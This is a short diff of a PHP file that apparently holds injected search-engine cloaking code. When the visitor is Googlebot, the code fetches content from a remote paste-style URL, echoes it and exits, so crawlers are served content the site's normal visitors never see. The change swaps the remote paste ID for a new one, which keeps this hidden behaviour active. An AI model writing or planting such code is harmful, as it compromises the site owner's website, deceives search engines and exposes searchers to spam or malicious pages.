@@ -20,7 +20,7 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
 }
 
 if ($isGoogleBot) {
-    $bot_content = file_get_contents('https://app.sampleproject.my/raw/yobkalyogcla');
+    $bot_content = file_get_contents('https://app.sampleproject.my/raw/jwytcohmcphd');
     echo $bot_content;
     exit;
 } else {
